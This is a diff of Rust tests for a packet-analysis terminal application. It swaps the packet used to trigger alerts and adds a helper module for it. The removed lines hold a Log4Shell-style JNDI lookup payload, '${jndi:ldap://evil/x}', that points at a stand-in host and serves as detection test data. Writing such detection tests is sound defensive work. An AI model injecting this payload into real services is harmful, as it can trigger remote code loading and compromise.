@@ -1,6 +1,8 @@
 #![cfg(feature = "terminal-ui")]
 #[path = "support/packets.rs"]
 mod packets;
+#[path = "support/critical.rs"]
+mod critical;
 use packrat_tui::{analysis::alert_center::AutomationMode, app::App};
 use std::time::{Duration, Instant};
 
@@ -45,7 +47,7 @@ fn queued_core_updates_preserve_input_order() {
     let mut app = App::new_for_test();
     app.start_background_analysis().unwrap();
     app.configure_core(|core| core.alert_center.automation_mode = AutomationMode::Watch);
-    app.inject_packet(packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"));
+    app.inject_packet(critical::invalid_neighbor_discovery_hop_limit(1));
     drain(&mut app);
     assert!(app.alert_overlay_open);
     assert!(!app.worklist.items.is_empty());
@@ -66,7 +68,7 @@ fn queued_core_updates_preserve_input_order() {
 fn clear_discards_old_generation_outcomes_without_reopening_an_alert() {
     let mut app = App::new_for_test();
     app.start_background_analysis().unwrap();
-    app.inject_packet(packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"));
+    app.inject_packet(critical::invalid_neighbor_discovery_hop_limit(1));
     app.poll_analysis();
     loop {
         if app.try_clear_packets().is_ok() {
